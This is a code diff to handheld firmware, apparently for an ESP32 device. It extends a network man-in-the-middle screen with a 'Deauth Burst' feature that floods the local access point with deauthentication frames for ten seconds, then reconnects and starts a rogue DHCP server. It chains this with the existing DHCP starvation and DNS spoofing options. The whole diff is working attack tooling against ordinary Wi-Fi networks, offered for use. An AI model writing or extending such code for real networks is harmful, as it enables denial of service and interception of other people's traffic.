@@ -30,14 +30,28 @@ void NetworkMitmScreen::onItemSelected(uint8_t index)
   if (_state != STATE_MENU) return;
 
   switch (index) {
-    case 0: // Rogue DHCP
-      _rogueEnabled = !_rogueEnabled;
-      _rogueSub = _rogueEnabled ? "On" : "Off";
-      _menuItems[0].sublabel = _rogueSub.c_str();
+    case 0: // DHCP Starvation
+      _starvEnabled = !_starvEnabled;
+      _starvSub = _starvEnabled ? "On" : "Off";
+      _menuItems[0].sublabel = _starvSub.c_str();
       render();
       break;
 
-    case 1: { // DNS Spoof
+    case 1: // Deauth Burst
+      _deauthBurst = !_deauthBurst;
+      _deauthSub = _deauthBurst ? "On" : "Off";
+      _menuItems[1].sublabel = _deauthSub.c_str();
+      render();
+      break;
+
+    case 2: // Rogue DHCP
+      _rogueEnabled = !_rogueEnabled;
+      _rogueSub = _rogueEnabled ? "On" : "Off";
+      _menuItems[2].sublabel = _rogueSub.c_str();
+      render();
+      break;
+
+    case 3: { // DNS Spoof
       if (!_dnsEnabled) {
         if (!Uni.Storage || !Uni.Storage->exists(DnsSpoofServer::CONFIG_PATH)) {
           ShowStatusAction::show("dns_config not found", 1500);
@@ -47,12 +61,12 @@ void NetworkMitmScreen::onItemSelected(uint8_t index)
       }
       _dnsEnabled = !_dnsEnabled;
       _dnsSub = _dnsEnabled ? "On" : "Off";
-      _menuItems[1].sublabel = _dnsSub.c_str();
+      _menuItems[3].sublabel = _dnsSub.c_str();
       render();
       break;
     }
 
-    case 2: { // File Manager
+    case 4: { // File Manager
       if (!_fmEnabled) {
         if (!Uni.Storage || !Uni.Storage->exists(WebFileManager::WEB_PATH)) {
           ShowStatusAction::show("File manager not\ndownloaded", 1500);
@@ -62,19 +76,12 @@ void NetworkMitmScreen::onItemSelected(uint8_t index)
       }
       _fmEnabled = !_fmEnabled;
       _fmSub = _fmEnabled ? "On" : "Off";
-      _menuItems[2].sublabel = _fmSub.c_str();
+      _menuItems[4].sublabel = _fmSub.c_str();
       render();
       break;
     }
 
-    case 3: // DHCP Starvation
-      _starvEnabled = !_starvEnabled;
-      _starvSub = _starvEnabled ? "On" : "Off";
-      _menuItems[3].sublabel = _starvSub.c_str();
-      render();
-      break;
-
-    case 4: // Start
+    case 5: // Start
       _start();
       break;
   }
@@ -107,6 +114,19 @@ void NetworkMitmScreen::onUpdate()
     _rogueDhcp.update();
   }
 
+  // Deauth burst phase
+  if (_deauthRunning) {
+    unsigned long elapsed = millis() - _deauthStart;
+    if (elapsed >= 10000) {
+      _stopDeauthBurst();
+      _reconnectStaticIP();
+      _startRogueDhcp();
+    } else if (_attacker) {
+      _attacker->deauthenticate(_savedBSSID, _savedChannel);
+      delay(50);
+    }
+  }
+
   // DHCP Starvation (non-blocking: one step per frame)
   if (_starvRunning) {
     _starv.step();
@@ -122,8 +142,12 @@ void NetworkMitmScreen::onUpdate()
                (unsigned long)s.ack, (unsigned long)s.nak);
       _addLog(buf);
 
-      // Chain: start Rogue DHCP now
-      _startRogueDhcp();
+      // Chain: deauth burst if enabled, then rogue DHCP
+      if (_deauthBurst) {
+        _startDeauthBurst();
+      } else {
+        _startRogueDhcp();
+      }
     } else if (_starv.isStuck()) {
       _starvRunning = false;
       _starv.stop();
@@ -153,13 +177,15 @@ void NetworkMitmScreen::_showMenu()
   _dnsSub    = _dnsEnabled ? "On" : "Off";
   _fmSub     = _fmEnabled ? "On" : "Off";
   _starvSub  = _starvEnabled ? "On" : "Off";
+  _deauthSub = _deauthBurst ? "On" : "Off";
 
-  _menuItems[0] = {"Rogue DHCP",       _rogueSub.c_str()};
-  _menuItems[1] = {"DNS Spoof",        _dnsSub.c_str()};
-  _menuItems[2] = {"File Manager",     _fmSub.c_str()};
-  _menuItems[3] = {"DHCP Starvation",  _starvSub.c_str()};
-  _menuItems[4] = {"Start"};
-  setItems(_menuItems, 5);
+  _menuItems[0] = {"DHCP Starvation",  _starvSub.c_str()};
+  _menuItems[1] = {"Deauth Burst",     _deauthSub.c_str()};
+  _menuItems[2] = {"Rogue DHCP",       _rogueSub.c_str()};
+  _menuItems[3] = {"DNS Spoof",        _dnsSub.c_str()};
+  _menuItems[4] = {"File Manager",     _fmSub.c_str()};
+  _menuItems[5] = {"Start"};
+  setItems(_menuItems, 6);
 }
 
 // ── Start ───────────────────────────────────────────────────────────────────
@@ -175,11 +201,21 @@ void NetworkMitmScreen::_start()
     return;
   }
 
-  _state        = STATE_RUNNING;
-  _logCount     = 0;
-  _lastDraw     = 0;
-  _starvRunning = false;
-  _instance     = this;
+  _state         = STATE_RUNNING;
+  _logCount      = 0;
+  _lastDraw      = 0;
+  _starvRunning  = false;
+  _deauthRunning = false;
+  _instance      = this;
+
+  // Save network info for deauth burst + reconnect
+  _savedSSID     = WiFi.SSID();
+  _savedPassword = "";  // WiFi keeps credentials internally
+  _savedIP       = WiFi.localIP();
+  _savedGateway  = WiFi.gatewayIP();
+  _savedSubnet   = WiFi.subnetMask();
+  _savedChannel  = WiFi.channel();
+  memcpy(_savedBSSID, WiFi.BSSID(), 6);
 
   IPAddress localIP = WiFi.localIP();
   char ipBuf[40];
@@ -265,10 +301,63 @@ void NetworkMitmScreen::_startRogueDhcp()
   }
 }
 
+// ── Deauth Burst ────────────────────────────────────────────────────────────
+
+void NetworkMitmScreen::_startDeauthBurst()
+{
+  _addLog("[*] Deauth burst (10s)...");
+  _drawLog();
+
+  // Disconnect from network first
+  WiFi.disconnect(true);
+  delay(100);
+
+  // Create attacker (sets WIFI_MODE_APSTA)
+  _attacker = new WifiAttackUtil();
+  _deauthRunning = true;
+  _deauthStart = millis();
+}
+
+void NetworkMitmScreen::_stopDeauthBurst()
+{
+  _deauthRunning = false;
+  if (_attacker) {
+    delete _attacker;
+    _attacker = nullptr;
+  }
+  _addLog("[+] Deauth burst done");
+}
+
+void NetworkMitmScreen::_reconnectStaticIP()
+{
+  _addLog("[*] Reconnecting (static IP)...");
+  _drawLog();
+
+  WiFi.mode(WIFI_STA);
+  WiFi.config(_savedIP, _savedGateway, _savedSubnet, _savedGateway);
+  WiFi.begin(_savedSSID.c_str(), nullptr, _savedChannel, _savedBSSID);
+
+  unsigned long start = millis();
+  while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
+    delay(100);
+  }
+
+  if (WiFi.status() == WL_CONNECTED) {
+    char buf[60];
+    snprintf(buf, sizeof(buf), "[+] Reconnected: %s", WiFi.localIP().toString().c_str());
+    _addLog(buf);
+  } else {
+    _addLog("[!] Reconnect failed");
+  }
+}
+
 // ── Stop ────────────────────────────────────────────────────────────────────
 
 void NetworkMitmScreen::_stop()
 {
+  if (_deauthRunning) {
+    _stopDeauthBurst();
+  }
   if (_starvRunning) {
     _starv.stop();
     _starvRunning = false;
@@ -283,13 +372,15 @@ void NetworkMitmScreen::_stop()
     _fileManager.end();
   }
 
-  _instance = nullptr;
-  _rogueEnabled = false;
-  _dnsEnabled = false;
-  _fmEnabled = false;
-  _starvEnabled = false;
-  _logCount = 0;
-  _lastDraw = 0;
+  _instance       = nullptr;
+  _rogueEnabled   = false;
+  _dnsEnabled     = false;
+  _fmEnabled      = false;
+  _starvEnabled   = false;
+  _deauthBurst    = false;
+  _deauthRunning  = false;
+  _logCount       = 0;
+  _lastDraw       = 0;
 
   ShowStatusAction::show("Stopped", 1000);
 }
@@ -367,7 +458,11 @@ void NetworkMitmScreen::_drawLog()
   sp.setTextDatum(TL_DATUM);
 
   char label[40];
-  if (_starvRunning) {
+  if (_deauthRunning) {
+    int remaining = 10 - (int)((millis() - _deauthStart) / 1000);
+    if (remaining < 0) remaining = 0;
+    snprintf(label, sizeof(label), "Deauth: %ds left", remaining);
+  } else if (_starvRunning) {
     const auto& s = _starv.stats();
     snprintf(label, sizeof(label), "A:%lu N:%lu T:%lu CT:%d/20",
              (unsigned long)s.ack, (unsigned long)s.nak,
